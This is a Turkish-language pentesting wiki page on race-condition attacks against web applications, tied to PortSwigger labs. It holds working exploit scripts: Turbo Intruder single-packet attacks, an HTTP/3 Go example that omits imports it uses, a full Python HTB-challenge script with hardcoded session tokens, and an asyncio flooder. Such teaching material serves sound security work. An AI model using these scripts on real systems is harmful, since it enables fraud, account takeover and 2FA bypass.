# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Bu teknik hakkında derinlemesine bir anlayış elde etmek için orijinal raporu şu adreste inceleyin: [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Race Condition Saldırılarını Geliştirme

Ana engel, birden çok isteğin aynı anda işlendiğinden emin olmak ve işlem süreleri arasındaki farkın **çok az olması — ideal olarak 1ms'den az** olduğundan emin olmaktır.

İstekleri Senkronize Etme için bazı teknikler:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Tek bir TCP bağlantısı üzerinden iki istek göndermeyi destekler, ağ jitter etkisini azaltır. Ancak sunucu tarafı değişkenlikleri nedeniyle iki istek tutarlı bir race condition exploit'i için yeterli olmayabilir.
- **HTTP/1.1 'Last-Byte Sync'**: 20-30 isteğin çoğu bölümünü önceden göndermeyi sağlar, küçük bir fragmanı geri tutar ve bu fragmanlar daha sonra birlikte gönderilerek sunucuda eşzamanlı varış elde edilir.

**Preparation for Last-Byte Sync** şu adımları içerir:

1. Başlıkları ve gövde verisini son bayt hariç gönderip stream'i sonlandırmamak.
2. İlk gönderim sonrası 100ms beklemek.
3. Son frameleri gruplamak için TCP_NODELAY'i devre dışı bırakıp Nagle's algorithm'i kullanmak.
4. Bağlantıyı ısıtmak için ping atmak.

Geri tutulan framelerin sonraki gönderimi tek bir pakette ulaşmalarına neden olmalı; bu Wireshark ile doğrulanabilir. Bu yöntem, genellikle RC saldırılarına dahil olmayan statik dosyalar için uygulanmaz.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3, QUIC (UDP) üzerinde çalışır. TCP coalescing veya Nagle'a dayanma imkânı yoktur, bu yüzden klasik last‑byte sync kutudan çıkan istemcilerle çalışmaz. Bunun yerine, bir UDP datagramı içinde birden çok QUIC stream‑final DATA frame'ini (FIN) kasten koalesce etmeniz gerekir; böylece sunucu tüm hedef istekleri aynı işlem zaman diliminde işler.
- **How to do it**: QUIC frame control'u açığa çıkaran amaçlı bir kütüphane kullanın. Örneğin, H3SpaceX quic-go'yu manipüle ederek hem body içeren istekler hem de body içermeyen GET‑stil istekler için HTTP/3 last‑frame synchronization uygular.
- Requests‑with‑body: N stream için HEADERS + DATA'yı son bayt hariç gönderin, sonra her stream'in son baytını birlikte flush edin.
- GET‑style: sahte DATA frameleri (veya Content‑Length ile çok küçük bir body) oluşturun ve tüm stream'leri tek bir datagramda sonlandırın.
- **Practical limits**:
  - Eşzamanlılık, peer’in QUIC max_streams transport parametresi ile sınırlıdır (HTTP/2’nin SETTINGS_MAX_CONCURRENT_STREAMS parametresine benzer). Eğer düşükse, birden fazla H3 bağlantısı açıp race'i bunlara dağıtın.
  - UDP datagram boyutu ve path MTU, kaç tane stream‑final frame'i koalesce edebileceğinizi sınırlar. Kütüphane gerekiyorsa birden fazla datagrama bölmeyi halleder; ancak tek bir datagram flush en güvenilirdir.
- **Practice**: H3SpaceX'e eşlik eden kamuya açık H2/H3 race lab'ları ve örnek exploit'ler bulunmaktadır.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Sunucu Mimarisine Uyum Sağlama

Hedefin mimarisini anlamak kritik öneme sahiptir. Ön uç sunucular istekleri farklı yollarla yönlendirebilir ve bu zamanlamayı etkileyebilir. Önemsiz isteklerle yapılan sunucu tarafı bağlantı ısındırması, istek zamanlamasını normalize edebilir.

#### Oturum Tabanlı Kilitlemeyi Yönetme

PHP's session handler gibi framework'ler istekleri oturum bazında serialize edebilir ve bu durum zafiyetleri gizleyebilir. Her istek için farklı session token'ları kullanmak bu sorunu aşabilir.

#### Hız veya Kaynak Limitlerini Aşma

Bağlantı ısındırma etkisizse, dummy isteklerle yapılacak bir sel yoluyla web sunucularının rate veya kaynak limit gecikmelerini kasıtlı olarak tetiklemeniz, sunucu tarafında race condition'lara elverişli bir gecikme oluşturarak single-packet attack'i kolaylaştırabilir.

## Saldırı Örnekleri

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: İsteği **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`) aracılığıyla gönderebilirsiniz, istekte brute force yapmak istediğiniz değeri **`%s`** için `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` gibi değiştirebilir ve ardından açılır menüden **`examples/race-single-packer-attack.py`** dosyasını seçebilirsiniz:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Eğer **farklı değerler gönderecekseniz**, kodu panodan bir wordlist kullanan bu versiyonla değiştirebilirsiniz:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Eğer web sitesi HTTP2'yi desteklemiyorsa (sadece HTTP1.1), `Engine.THREADED` veya `Engine.BURP`'ı `Engine.BURP2` yerine kullanın.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Eğer RCE'yi tetiklemek için önce 1 endpoint'e ve sonra diğer endpoint'lere birden fazla istek göndermeniz gerekiyorsa, `race-single-packet-attack.py` script'ini aşağıdaki gibi değiştirebilirsiniz:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Bu, Burp Suite içindeki **Repeater**'da yeni '**Send group in parallel**' seçeneği aracılığıyla da kullanılabilir.
- **limit-overrun** için, gruba **same request 50 times** ekleyebilirsiniz.
- **connection warming** için, grubun **başına** web sunucusunun statik olmayan bazı kısımlarına **requests** ekleyebilirsiniz.
- 2 substates adımlarda, bir **request** ile diğerinin işlenmesi arasındaki süreci **delaying** için, bu iki **request** arasına ekstra **requests** ekleyebilirsiniz.
- **multi-endpoint** RC için, **request**'i **goes to the hidden state** olanı göndermeye başlayıp hemen ardından **hidden state**'i **exploits** eden **50 requests** gönderebilirsiniz.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Bu scriptin amacı, bir kullanıcının email adresini değiştirmek ve yeni email'in verification token'ı son emaile ulaşana kadar sürekli doğrulamaktır (kodda, email değiştirilebildiği fakat verification'ın eski adrese gönderildiği bir RC görülüyordu çünkü email'i gösteren değişken zaten ilk email ile doldurulmuştu).\
Gelen emaillerde "objetivo" kelimesi bulunduğunda, değiştirilen emailin verification token'ını aldığımızı anlıyoruz ve saldırıyı sonlandırıyoruz.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine selection: single‑packet attack'ı tetiklemek için HTTP/2 hedeflerde `Engine.BURP2` kullanın; HTTP/1.1 last‑byte sync için `Engine.THREADED` veya `Engine.BURP`'e geri dönün.
- `gate`/`openGate`: birçok kopyayı `gate='race1'` (veya her deneme için gate'ler) ile kuyruğa alın; bu, her isteğin kuyruğunu tutar; `openGate('race1')` tüm kuyrukları birlikte boşaltır, böylece neredeyse eşzamanlı olarak ulaşırlar.
- Diagnostics: Turbo Intruder'daki negatif zaman damgaları, sunucunun isteğin tamamen gönderilmesinden önce yanıt verdiğini gösterir ve çakışmayı kanıtlar. Bu, gerçek race'lerde beklenen bir durumdur.
- Connection warming: zamanlamaları stabilize etmek için önce bir ping veya birkaç zararsız istek gönderin; isteğe bağlı olarak son framelerin gruplanmasını teşvik etmek için `TCP_NODELAY`'ı devre dışı bırakın.


### Improving Single Packet Attack

Orijinal araştırmada bu saldırının 1.500 bayt limiti olduğu açıklanıyor. Ancak, [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) tek paketin 1.500 baytlık sınırlamasının IP katmanı parçalanması (splitting a single packet into multiple IP packets) kullanılarak TCP'nin **65,535 B pencere** sınırlamasına nasıl genişletilebileceğini anlattı — fragment'ları farklı sırayla gönderip paket yeniden birleştirilene kadar yeniden oluşturulmasını engellemek mümkün oluyor. Bu teknik, araştırmacının yaklaşık 166ms içinde 10.000 istek göndermesine izin verdi.

Bu iyileştirmenin, yüzlerce/binlerce paketin aynı anda ulaşmasını gerektiren RC durumlarında saldırıyı daha güvenilir hale getirdiğini unutmayın; ancak bazı yazılım sınırlamaları da olabilir. Apache, Nginx ve Go gibi bazı popüler HTTP sunucularının `SETTINGS_MAX_CONCURRENT_STREAMS` ayarı sırasıyla 100, 128 ve 250 gibi katı değerlere sahiptir. Buna karşın NodeJS ve nghttp2 gibi diğerleri için bu sınırsızdır.\
Bu temel olarak Apache'nin tek bir TCP bağlantısından sadece 100 HTTP bağlantısını dikkate alacağı anlamına gelir (bu RC saldırısını sınırlayabilir). HTTP/3 için benzer limit, QUIC’in max_streams transport parameter'ıdır — eğer küçükse, yarışınızı birden fazla QUIC bağlantısına yayın.

Bu tekniği kullanan bazı örnekleri repo'da bulabilirsiniz [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Önceki araştırmadan önce, RC'ye neden olmak için paketleri mümkün olduğunca hızlı göndermeyi deneyen bazı payload'lar kullanılıyordu.

- **Repeater:** Önceki bölümdeki örnekleri inceleyin.
- **Intruder**: **request**'i **Intruder**'a gönderin, **Options** menüsünde **number of threads**'i **30** olarak ayarlayın; payload olarak **Null payloads**'ı seçin ve **30** üretin.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodolojisi**

### Limit-aşımı / TOCTOU

Bu, en temel tür race condition'dır; **vulnerabilities**'ın **appear** ettiği ve **limit the number of times you can perform an action** yerlerde ortaya çıkar. Örneğin bir web mağazasında aynı indirim kodunun birkaç kez kullanılması. Çok basit bir örnek [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) veya [**this bug**](https://hackerone.com/reports/759247)**.**

Bu tür saldırıların birçok çeşidi vardır, örneğin:

- Bir hediye kartını birden fazla kez kullanma
- Bir ürünü birden fazla kez puanlama
- Hesap bakiyenizi aşacak şekilde nakit çekme veya transfer etme
- Tek bir CAPTCHA çözümünü yeniden kullanma
- Bir anti-brute-force rate limit'i atlatma

### **Gizli alt durumlar**

Karmaşık race condition'ları istismar etmek genellikle kısa süreli fırsatları, gizli veya **istenmeyen makine alt durumları** ile etkileşime girerek değerlendirmeyi içerir. Yaklaşım şu şekildedir:

1. **Potansiyel Gizli Alt Durumları Belirleyin**
- Kritik verileri değiştiren veya onlarla etkileşime giren endpoint'leri tespit ederek başlayın; örneğin kullanıcı profilleri veya password reset süreçleri. Şuna odaklanın:
- **Storage**: Client-side verileri işleyen endpoint'lerden ziyade server-side persistent veriyi manipüle eden endpoint'leri tercih edin.
- **Action**: Mevcut veriyi değiştiren işlemleri arayın; yeni veri ekleyenlerden daha olası olarak istismar edilebilir durumlar yaratırlar.
- **Keying**: Başarılı saldırılar genellikle aynı identifier'a (ör. kullanıcı adı veya reset token) göre keylenen işlemleri içerir.
2. **İlk Sondajı Yapın**
- Tespit ettiğiniz endpoint'leri race condition saldırılarıyla test edin ve beklenen sonuçlardan sapmaları gözlemleyin. Beklenmeyen yanıtlar veya uygulama davranışındaki değişiklikler bir zafiyeti işaret edebilir.
3. **Zafiyeti Gösterin**
- Saldırıyı istismar etmek için gereken minimal istek sayısına indirgeme yapın; çoğu zaman sadece iki istek yeterlidir. Bu adım, hassas zamanlama nedeniyle birçok deneme veya otomasyon gerektirebilir.

### Zamana Duyarlı Saldırılar

İsteklerin zamanlamasındaki hassasiyet zafiyetleri ortaya çıkarabilir, özellikle timestamp gibi öngörülebilir yöntemler security token'lar için kullanıldığında. Örneğin, password reset token'larının zaman damgalarına dayanarak üretilmesi, eşzamanlı istekler için aynı token'ların oluşmasına izin verebilir.

**İstismar etmek için:**

- Tek paketlik bir saldırı gibi hassas zamanlama kullanarak eşzamanlı password reset istekleri yapın. Aynı token'ların oluşması bir zafiyeti gösterir.

**Örnek:**

- İki password reset token'ı aynı anda isteyin ve karşılaştırın. Token'ların eşleşmesi token üretiminde bir kusuru işaret eder.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Gizli alt durum vaka çalışmaları

### Pay & add an Item

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) **to see how to** ödemeyi bir mağazada yapıp aynı zamanda ekstra bir ürün ekleyerek onun için ödeme yapmanıza gerek kalmayacak şekilde nasıl davranılabileceğini görün.

### Confirm other emails

Fikir, bir e-posta adresini doğrularken aynı anda onu farklı bir adrese değiştirmek ve platformun yeni adresi gerçekten doğrulayıp doğrulamadığını görmektir.

### Change email to 2 emails addresses Cookie based

According to [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab bu yöntemle takeover'a karşı savunmasızdı çünkü bir e-postanın email verification token'ını diğer e-postaya gönderebilirdi.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Gizli Veritabanı durumları / Confirmation Bypass

Eğer bir veritabanına bilgi eklemek için **2 farklı write** kullanılıyorsa, veritabanına yalnızca ilk verinin yazılmış olduğu kısa bir zaman dilimi olur. Örneğin, bir kullanıcı oluşturulurken önce **username** ve **password** yazılabilir ve ardından yeni oluşturulan hesabı onaylamak için token yazılabilir. Bu, kısa bir süre için onay token'ının null olduğu anlamına gelir.

Bu nedenle bir hesap kayıt edip hemen ardından boş token ile (`token=` veya `token[]=` veya başka herhangi bir varyasyon) birkaç istek göndermek, e-postaya sahip olmadığınız bir hesabı **onaylamanıza** izin verebilir.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### 2FA Atlatma

Aşağıdaki pseudo-code race condition'a karşı savunmasızdır çünkü çok kısa bir süre için session oluşturulurken **2FA uygulanmaz**:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Bu hizmetler bir application oluşturmanıza ve provider tarafından kayıtlı kullanıcıları authenticate etmenize izin verir. Bunu yapabilmek için **client** uygulamanızın **OAUth provider** içindeki bazı verilere erişmesine **izin vermeniz** gerekir.\
Yani buraya kadar google/linkedin/github... ile sıradan bir login; karşınıza "_Application <InsertCoolName> wants to access you information, do you want to allow it?_" diyen bir sayfa çıkar.

#### Race Condition in `authorization_code`

Sorun, siz **onayladığınızda** başlar ve otomatik olarak kötü niyetli uygulamaya bir **`authorization_code`** gönderilir. Ardından bu **application**, hesabınız için **`authorization_code`**'dan birden fazla AT/RT (_Authentication Token/Refresh Token_) üretmek amacıyla OAUth servis sağlayıcısında bir Race Condition'ı suistimal eder. Temelde uygulamayı verilerinize erişmeye izin vermenizi suistimal ederek **birden fazla hesap** oluşturur. Sonrasında uygulamanın erişimini **kaldırsanız bile**, bir çift AT/RT silinebilir ama diğerleri hâlâ geçerli kalır.

#### Race Condition in `Refresh Token`

Geçerli bir RT elde ettiğinizde, onu **birden fazla AT/RT üretmek** için suistimal etmeye çalışabilirsiniz ve **kullanıcı uygulamanın izinlerini iptal etse bile**, birden fazla RT hala geçerli kalır.

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) reposunda websocket mesajlarını **paralel** şekilde göndererek Web Sockets içinde de **Race Conditions**'ı suistimal etmeye yönelik bir Java PoC bulabilirsiniz.
- Burp’ın WebSocket Turbo Intruder ile **THREADED** engine'i kullanarak birden çok WS bağlantısı oluşturabilir ve payload'ları paralel olarak gönderebilirsiniz. Resmi örnekten başlayın ve concurrency için `config()` (thread count) değerini ayarlayın; sunucu tarafı state'i WS handler'ları arasında yarıştırırken tek bir bağlantıda batchlemek yerine bu genelde daha güvenilirdir. Bakınız [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Referanslar

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
